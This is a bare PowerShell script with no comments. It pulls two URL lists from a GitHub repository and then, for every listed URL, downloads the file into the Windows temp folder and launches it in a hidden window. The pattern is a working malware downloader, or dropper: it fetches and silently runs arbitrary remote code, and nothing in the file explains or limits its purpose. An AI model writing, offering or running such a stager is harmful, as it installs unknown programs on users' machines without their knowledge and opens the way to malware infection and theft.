$urls = (iwr "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/best_urls.txt").Content -split "`n"

foreach ($u in $urls) {
    $u = $u.Trim()
    if ($u) {
        $path = "$env:TEMP\$(Split-Path $u -Leaf)"
        iwr $u -OutFile $path
        Start-Process $path -WindowStyle Hidden
    }
}


$urls = (iwr "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/urls.txt").Content -split "`n"

foreach ($u in $urls) {
    $u = $u.Trim()
    if ($u) {
        $path = "$env:TEMP\$(Split-Path $u -Leaf)"
        iwr $u -OutFile $path
        Start-Process $path -WindowStyle Hidden
    }
}
